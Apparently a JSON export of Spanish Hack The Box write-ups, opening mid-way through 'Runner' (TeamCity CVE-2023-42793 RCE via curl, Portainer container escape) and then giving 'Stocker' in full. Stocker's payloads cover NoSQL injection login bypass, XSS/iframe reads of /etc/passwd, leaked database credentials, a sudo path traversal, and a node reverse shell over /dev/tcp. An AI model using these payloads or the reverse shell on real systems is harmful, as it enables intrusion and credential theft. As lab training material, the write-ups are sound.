xKzxjsB7irPtZxWmBUcFHbCrOekiR56G2MUCqQkYfn6sJ2v0/Rp6PZHNScdXTMDEl10qtAWQHkfhxGO8gimrAvjruuarpItDzr4QcADDQ5HTU8PSe/J2KL3PY7i4zWw9+/CyPd0t9yB5MKgK8c9z2ecgZsAAAALam9obkBydW5uZXI=Bingo…. Tenemos una clave privada id_rsa para entrar por ssh y ejecutar comandos, muy bien… ya llegamos hasta esta parte… ahora voy a explicar otra manera para conseguir RCE en la maquina…. nos vamos a aprovechar de un endpoint de teamcity.Intrusion Via Web Metodo 2Para este metodo el post CVE-2023-42793 nos indica que tenemos que habilitar el modo debug para conseguir RCEcurl -s -X POST \"http://teamcity.runner.htb/app/rest/debug/processes?exePath=id\" -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2' Responding with error, status code: 400 (Bad Request).Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via \"rest.debug.processes.enable\" internal propertyInvalid request. Please check the request URL and data are correct.nos tira ese error porque todavia no habilitamos el modo debug, asi que vamos a hacerlocurl -X POST 'http://teamcity.runner.htb/admin/dataDir.html?action=edit&amp;fileName=config%2Finternal.properties&amp;content=rest.debug.processes.enable=true' -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'bien, ahora la parte final es volver a ejecutar el primer comando que realizamoscurl -s -X POST \"http://teamcity.runner.htb/app/rest/debug/processes?exePath=id\" -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'StdOut:uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)StdErr: Exit code: 0Time: 27msaclaro que este token es el primero que me dio teamcity a la hora de crear mi usuario con privilegios maximos si necesitan volver a generarlo en la explicacion del PoC explico como borrar el token y por logica crear otro. Yo prefiero obtener una shell por SSH porque es mas comodo la TTY.A la clave privada le tienen que asignar privilegios 600 con chmod y luego pasarle el -i para importar la id_rsaEscalada de PrivilegiosEnumerando los puertos abiertos dentro de la maquina nos encontramos con el puerto 9000 abierto internamente, posterior a eso con ps queremos ver lo que se esta ejecutando en ese puerto, pero sin exito.john@runner:~$ mount | grep procproc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=29,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=19243)binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)No podemos ver procesos que corren de otros usuarios en el hipeid -&gt; esta en invisiblejohn@runner:~$ curl -s http://localhost:9000 | head -n 3&lt;!doctype html&gt;&lt;html lang=\"en\" ng-app=\"portainer\" ng-strict-di data-edition=\"CE\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"/&gt;&lt;title&gt;Portainer&lt;/title&gt;&lt;meta name=\"description\" content=\"\"/&gt;&lt;meta name=\"author\" content=\"Portainer.io\"/&gt;&lt;meta http-equiv=\"cache-control\" content=\"no-cache\"/&gt;&lt;meta http-equiv=\"expires\" content=\"0\"/&gt;&lt;meta http-equiv=\"pragma\" content=\"no-cache\"/&gt;&lt;base id=\"base\"/&gt;&lt;script&gt;if (window.origin == 'file://') {        // we are loading the app from a local file as in docker extension        document.getElementById('base').href = 'http://localhost:49000/';Viendo lo que hay en el puerto 9000, notamos que es un portainer.io y vemos la palabra docker… ahora todo tiene sentido con las 2 intrusiones, si hubiesemos entrado con el RCE del metodo debug hubieramos ganado acceso dentro de un contendor portainer, teniendo en cuenta todo esto vamos a realizar un Local Port Fordwarding con SSHEs importante anotar todo lo que conseguimos a la hora de enumerar la maquina, recordemos que tenemos credenciales de matthew y no nos sirivieron para nada. En esta ocasion puede ser que funcioneQue es Portainer?Portainer es una herramienta web open-source la cual se ejecuta ella misma como un container, por tanto deberemos tener Docker instalado. Esta aplicación nos va a permitir gestionar de forma muy fácil e intuitiva nuestros contenedores Docker a través de una interfaz gráfica.Listo estamos dentro de portainer lo primero que haria como atacante es buscar en que version estamos y ir viendo como podemos aprovecharnos de los contenedores, podemos ver malas configuraciones de docker o vulnerabilidades asociadas a CVEs.Si clickeo en primary tenemos mas opciones y configuraciones las mas importantes son imagesTenemos 2 imagenes: ubuntu:latest, teamcity:latestTambien tenemos 2 volumenes, un volumen en docker es un área de almacenamiento de datos que puede montarse en un contenedor para proporcionar almacenamiento persistente, si leemos la documentacion de portainer nos muestra como crear un volumen. Yo creo que esta seria nuestra via para escalar privilegios.Le damos a add volume y agregamos estas configuraciones para crear el volumenCon esto ya tendriamos creado el nuevo volumen.Ahora nos dirigimos a containers y clickeamos a add container para crear un nuevo contenedorNombre test y en la imagen ponemos la imagen teamcity:latest… y abajo en configuracion avanzada vamos a agregar estos parametros.. Interactive &amp; TTY y en volumes /mnt/root para traernos la maquina real como una monturaClickeamos en deploy the container…. una vez que se cree vamos a clickear en el contenedor y darle en console para conseguir una shell grafica en la webEn user vamos a poner root y a darle a connect y listo…. en la carpeta mnt/root vamos a tener la maquina real y darle permisos SUID a la bash para escalar privilegios"
  },
  
  {
    "title": "Stocker - Hack The Box",
    "url": "/posts/stocker/",
    "categories": "htb, linux",
    "tags": "Linux, Fuzz, Wfuzz, LFI, API, Curl, App, Web, Mongo, NoSQL, XSS, Javascript",
    "date": "2025-10-14 00:00:00 +0000",
    





    
    "snippet": "Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identi...",
    "content": "Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identifica el nombre de host dev.stocker.htb y, al acceder a él, se carga una página de inicio de sesión que parece estar construida con NodeJS. Al enviar datos JSON y realizar una inyección NoSQL, se omite la página de inicio de sesión y se concede acceso a una tienda electrónica. La enumeración de esta tienda electrónica revela que, al enviar un pedido de compra, se crea un PDF que contiene detalles sobre los artículos comprados. Esta funcionalidad es vulnerable a la inyección de HTML y puede utilizarse indebidamente para leer archivos del sistema mediante el uso de iframes. A continuación, se lee el archivo index.js para obtener las credenciales de la base de datos y, debido a la reutilización de contraseñas, los usuarios pueden iniciar sesión en el sistema a través de SSH. A continuación, se pueden escalar los privilegios realizando un ataque de recorrido de ruta en un comando definido en el archivo sudoers, que contiene un comodín para ejecutar archivos JavaScript.ReconocimientoNmapnmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.196Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 08:43 EDTInitiating SYN Stealth Scan at 08:43Scanning 10.10.11.196 [65535 ports]Discovered open port 22/tcp on 10.10.11.196Discovered open port 80/tcp on 10.10.11.196Completed SYN Stealth Scan at 08:44, 17.18s elapsed (65535 total ports)Nmap scan report for 10.10.11.196Host is up, received user-set (0.15s latency).Scanned at 2024-04-29 08:43:56 EDT for 18sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Tenemos 2 puertos abiertos22 -&gt; SSH80 -&gt; HTTPNmap Servicios de Puertosnmap -p22,80 -sCV 10.10.11.196Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 08:48 EDTNmap scan report for stocker.htb (10.10.11.196)Host is up (0.20s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Stock - Coming Soon!|_http-generator: Eleventy v2.0.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTecnologias Webwhatweb http://10.10.11.196http://10.10.11.196 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.196], RedirectLocation[http://stocker.htb], Title[301 Moved Permanently], nginx[1.18.0]En esta fase de reconocimiento logramos ver un dominio stocker.htb vamos a colocarlo dentro del archivo /etc/hosts para que nos redirija la ip al dominio y poder ingresar a la web real.echo '10.10.11.196 stocker.htb' &gt;&gt; /etc/hostsWebEnumeracion Web Fuzzwfuzz -c --hc=404 --hh=15463 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \"http://stocker.htb/FUZZ\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://stocker.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                              =====================================================================000000039:   301        7 L      12 W       178 Ch      \"img\"                             000000550:   301        7 L      12 W       178 Ch      \"css\"                                                           000000953:   301        7 L      12 W       178 Ch      \"js\"                                                                     000002771:   301        7 L      12 W       178 Ch      \"fonts\"En esta parte encontramos cosas tipicas que existen en una web, sin embargo no son de relevancia. Tener una buena metodologia de enumeracion hace que puedas llegar mas alla y conseguir muchas vias de explotacion.Enumeracion Web Fuzz Domainwfuzz -c --hc=404 --hh=178,166 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H \"Host: FUZZ.stocker.htb\" http://stocker.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://stocker.htb/=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                         =====================================================================000000834:   302        0 L      4 W        28 Ch       \"dev\"Fuzzeamos en la parte donde van los subdominios y encontramos dev.stocker.htb, vamos a incorporarlo a nuestro /etc/hosts y ver que nos resuelve la web.curl http://dev.stocker.htb -I -v* Host dev.stocker.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.196*   Trying 10.10.11.196:80...* Connected to dev.stocker.htb (10.10.11.196) port 80&gt; HEAD / HTTP/1.1&gt; Host: dev.stocker.htb&gt; User-Agent: curl/8.5.0&gt; Accept: */*&gt; &lt; HTTP/1.1 302 FoundHTTP/1.1 302 Found&lt; Server: nginx/1.18.0 (Ubuntu)Server: nginx/1.18.0 (Ubuntu)&lt; Date: Mon, 29 Apr 2024 12:59:32 GMTDate: Mon, 29 Apr 2024 12:59:32 GMT&lt; Content-Type: text/plain; charset=utf-8Content-Type: text/plain; charset=utf-8&lt; Content-Length: 28Content-Length: 28&lt; Connection: keep-aliveConnection: keep-alive&lt; X-Powered-By: ExpressX-Powered-By: Express&lt; Location: /loginLocation: /login&lt; Vary: AcceptVary: Accept&lt; Set-Cookie: connect.sid=s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ; Path=/; HttpOnlySet-Cookie: connect.sid=s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ; Path=/; HttpOnlyEs importante observar cada detalle de la web que estamos auditando, asi podemos deducir el lenguaje con el que esta programado la aplicacion web.Tenemos un panel de acceso a login, puede ser vulnerable a SQL injection o NoSQL injection, vamos a comprobarlo ahora, hay mas probabilidad de que sea vulnerable a NoSQLI por diferentes motivos, una de ellas es que en las tecnologias que implementa aplicacion web es que esta desarrollado en Express JS y NodeJS, maneja entradas de application/jsonSQL Injectioncurl dev.stocker.htb/login -d \"username='&amp;password=test\"; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d \"username='+or+1=1--+-&amp;password=test\"; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d \"username='+or+sleep(10)--+-&amp;password=test\"; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d $'{\"username\":\"\\'\",\"password\":\"test\"}' -H 'Content-Type: application/json'; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d $'{\"username\":\"\\' or 1=1-- -\",\"password\":\"test\"}' -H 'Content-Type: application/json'; echoFound. Redirecting to /login?error=login-errorSiempre que vemos un panel de acceso quiero intentar bypassearlo de diferentes maneras, ya sea Inyecciones SQL o NoSQL (',\") pero como dije antes, estas inyecciones fallaron porque creemos que por detras existe un Mongo DB y no un MySQL como base de datos, quiere decir que la vulnerabilidad puede estar por un NoSQLINoSQL Injection y Bypass Authenticationcurl dev.stocker.htb/login -d 'username[$ne]=test&amp;password[$ne]=test'; echoFound. Redirecting to /login?error=login-errorcurl dev.stocker.htb/login -d $'{\"username\":{\"$ne\":\"test\"},\"password\":{\"$ne\":\"test\"}}' -H 'Content-Type: application/json'; echoFound. Redirecting to /stockYa tenemos una inyeccion exitosa, es importante que en la peticion agreguemos la cabezera Content-Type: application/json porque estamos enviando data en formato json, vamos reenviarlo por el puerto 127.0.0.1:8080 al burpsuite desde curlEste es el payload que usamos en la inyeccion para bypassear la autenticacion{\"username\":{\"$ne\": \"test\"}, \"password\": {\"$ne\":\"test\"}}Esto hara lo siguiente: siempre que haya al menos un usuario que no sea “test” y una contraseña que no sea “test”, ese usuario sera devuelto y iniciara sesion.curl dev.stocker.htb/login -d $'{\"username\":{\"$ne\":\"test\"},\"password\":{\"$ne\":\"test\"}}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080copiamos y pegamos la cookie de sesion y ya bypasseamos el panel de loginParece una aplicación web para comprar cosas raras. Hay 4 articulos en la web que Podemos agregar al carrito de compras.cuando hacemos click en ver carrito, se nos abre esta ventana indicando todos los componentes que agregamos. Vamos a darle a submit purchaseVemos un enlace en here que nos reedirige a http://dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a un comprobante de pago en PDF, esto nos resuelve a una api que esta a la vista del publico y expuesta. Para desglosar el PDF y ver el origen del mismo, procedemos al descargo y comprobar con exiftool de que se trata.Si ejecutamos exiftool en este documento, veremos que se genera usando Chromium (Skia/PDF m108):curl -s dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a | exiftool -  ExifTool Version Number         : 12.50File Size                       : 0 bytesFile Modification Date/Time     : 2023:01:14 00:00:00+01:00File Access Date/Time           : 2023:01:14 00:00:00+01:00File Inode Change Date/Time     : 2023:01:14 00:00:00+01:00File Permissions                : prw-rw----File Type                       : PDFFile Type Extension             : pdfMIME Type                       : application/pdfPDF Version                     : 1.4Linearized                      : NoPage Count                      : 1Tagged PDF                      : YesCreator                         : ChromiumProducer                        : Skia/PDF m108Create Date                     : 2023:01:13 23:00:00+00:00Modify Date                     : 2023:01:13 23:00:00+00:00en /stocks existe un flujo de peticiones importantes como /api/products, muestra toda la informacion sobre los productos que vende la aplicacion webEl comportamiento de esta aplicacion web es agregar un articulo a mi carrito y destella una ventana emergente, sin embargo no llega a enviar ninguna solicitud, por lo que ni siquiera se almacena de manera local, sino simplemente en el JavaScript del lado del cliente en ejecución.Interceptamos el boton submit purchaseincluye los articulos a comprar y algunos campos que podemos modificar y ver como se comporta la web.en la anterior imagen modificamos el valor de amount a no poner nada y dejarlo vacio, esto provoco un error en la web y nos devolvio algunas rutas que podriamos aprovechar si logramos conseguir algun File Inclusion.XSSHay una carga util que podemos utilizar para comprobar si es vulnerable a XSS.&lt;img src=\\\"x\\\" onerror=\\\"document.write('test')\\\" /&gt;Y porque elegimos el campo title?, es simple. Porque ese campo se ve reflejado en el comprobante de pago del PDF que generamos.La web informa que la compra se realizo correctamente. Al visitar la URL de esa orden de compra ( /api/po/[id]) muestra que funciono:test sobrescribio todo el resto del HTML/CSS que estaba creando el PDF.Read Local FileYa tenemos identificada la vulnerabilidad de XSS pero aparte de eso podemos derivarlo a una Lectura de archivos locales, de que manera logramos dicho objetivo?. Si una página web está creando un PDF utilizando una entrada controlada por el usuario, puedes intentar engañar al bot que está creando el PDF para que ejecute código JS arbitrario. Entonces, si el bot creador de PDF encuentra algún tipo de etiquetas HTML, las interpretará y puede abusar de este comportamiento para provocar un XSS en el servidor. Read Local File&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open(\"GET\",\"file:///etc/passwd\");x.send();&lt;/script&gt;tenemos que escapar las comillas dobles porque si no no funciona el payload&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};x.open(\\\"GET\\\",\\\"file:///etc/passwd\\\");x.send();&lt;/script&gt;En el comprobante de pago vemos lo siguiente: una cadena codificada en base64, vamos a decodificarla con el siguiente comandoecho \"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci\" | base64 -droot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usrbase64: entrada inválidaExcelente!!! Vemos el /etc/passwd, en este punto ya podemos decir que estamos ante un File Inclusion y podemos ver archivos del sistema, lo siguiente sera ver el codigo fuente para escalar esta vulnerabilidad.Pero vemos solo una parte del /etc/passwd, es decir solo las primeras 3 lineas. Para verlo completo podemos inyectar este payload:&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;Otro payload que puede funcionar y tener un mejor resultado a la hora de leer archivos internos de la maquina es este&lt;img src=\\\"x\\\" onerror=\\\"document.write('&lt;iframe src=file:///etc/passwd width=100% height=100%&gt;&lt;/iframe&gt;')\\\" /&gt;Ya que tenemos perfeccionado lo de leer correctamente los archivos, quedaria tratar de leer el codigo fuente de la aplicacion web “index.js” de /var/www/dev/index.jsconst express = require(\"express\");const mongoose = require(\"mongoose\");const session = require(\"express-session\");const MongoStore = require(\"connect-mongo\");const path = require(\"path\");const fs = require(\"fs\");const {    generatePDF,    formatHTML} = require(\"./pdf.js\");const {    randomBytes,    createHash} = require(\"crypto\");const app = express();const port = 3000;// TODO: Configure loading from dotenv for productionconst dbURI = \"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource = admin &amp; w = 1 \";app.use(express.json());app.use(express.urlencoded({    extended: false}));app.use(    session({        secret: randomBytes(32).toString(\"hex\"),        resave: false,        saveUninitialized: true,        store: MongoStore.create({            mongoUrl: dbURI,        }),    }));app.use(\"/static\", express.static(__dirname + \"/assets\"));app.get(\"/\", (req, res) =&gt; {    return res.redirect(\"/login\");});app.get(\"/api/products\", async (req, res) =&gt; {    if (!req.session.user) return res.json([]);    const products = await mongoose.model(\"Product\").find();    return res.json(products);});app.get(\"/login\", (req, res) =&gt; {    if (req.session.user) return res.redirect(\"/stock\");    return res.sendFile(__dirname + \"/templates/login.html\");});app.post(\"/login\", async (req, res) =&gt; {    const {        username,        password    } = req.body;    if (!username || !password) return res.redirect(\"/login?error=login-error\");    // TODO: Implement hashing    const user = await mongoose.model(\"User\").findOne({        username,        password    });    if (!user) return res.redirect(\"/login?error=login-error\");    req.session.user = user.id;    console.log(req.session);    return res.redirect(\"/stock\");});app.post(\"/api/order\", async (req, res) =&gt; {                if (!req.session.user) return res.json({});                if (!req.body.basket) return res.json({                    success: false                });                const order = new mongoose.model(\"Order\")({                            items: req.body.basket.map((item) =&gt; ({                                title: item.title,                                price: item.price,                                amount: item.amount                            })),Si analizamos bien el codigo, logramos ver en la parte superior credenciales de acceso a la base de datos const dbURI = \"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?Tambien tenemos un usuario del sistema llamado “angoose”root:x:0:0:root:/root:/bin/bashsshd:x:111:65534::/run/sshd:/usr/sbin/nologinfwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinangoose:x:1001:1001:,,,:/home/angoose:/bin/bashProbamos las credenciales que encontramos via ssh por el puerto 22 con el usuario angoosessh angoose@stocker.htbPassword:IHeardPassphrasesArePrettySecureangoose@stocker:~$ ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255        ether 00:50:56:b9:4d:1b  txqueuelen 1000  (Ethernet)        RX packets 148246  bytes 13714635 (13.7 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 127921  bytes 19524574 (19.5 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        loop  txqueuelen 1000  (Local Loopback)        RX packets 15696  bytes 2585569 (2.5 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 15696  bytes 2585569 (2.5 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0angoose@stocker:~$ hostname -I10.10.11.196Bingo!!!! Tenemos una shell por ssh, en esta parte ya podriamos ver la flag de user.txt, ahora solo quedaria enumerar el sistema y escalar privilegios.Enumeracion del SistemaVersion de Linux y Kernelangoose@stocker:~$ uname -aLinux stocker 5.4.0-136-generic #153-Ubuntu SMP Thu Nov 24 15:56:58 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxangoose@stocker:~$ lsb_release -aNo LSB modules are available.Distributor ID:\tUbuntuDescription:\tUbuntu 20.04.5 LTSRelease:\t20.04Codename:\tfocalSUDOVamos a ver si a nivel de SUDOERS tiene algun permiso para ejecutar algo como rootangoose@stocker:~$ sudo -l[sudo] password for angoose: Matching Defaults entries for angoose on stocker:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser angoose may run the following commands on stocker:    (ALL) /usr/bin/node /usr/local/scripts/*.jsY como dijimos antes vemos que a nivel de sudoers nos deja ejecutar como root la herramienta node cualquier .js script que se encuentre en esa carpeta, pero jugando un poco con bash podemos bypassear esa entrada y ejecutar codigo malicioso en jsEscalada de Privilegios [RCE JAVASCRIPT]sudo /usr/bin/node /usr/local/scripts/../../../../dev/shm/pwned.jsEl problema aquí es que, si bien el administrador claramente quería permitir que angoose solo ejecutara scripts desde ese directorio, * esto indica que cualquier script que se encuentre ahi lo va ejecutar pero no tenemos permisos de escritura para crear un archivo JS malicioso, asi que un ../ nos dejara ejecutar cualquier JS en el sistema de archivos.require(\"child_process\").exec('ping -c 1 10.10.16.2')Vamos a crear el script que contiene JS malicioso y lo vamos a guardar en /dev/shm/pwned.jsPrimero vamos a probar ejecuntando el comando ping a nuestra maquinaShell como Rootrequire(\"child_process\").exec('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1\"')"
  }
  
]

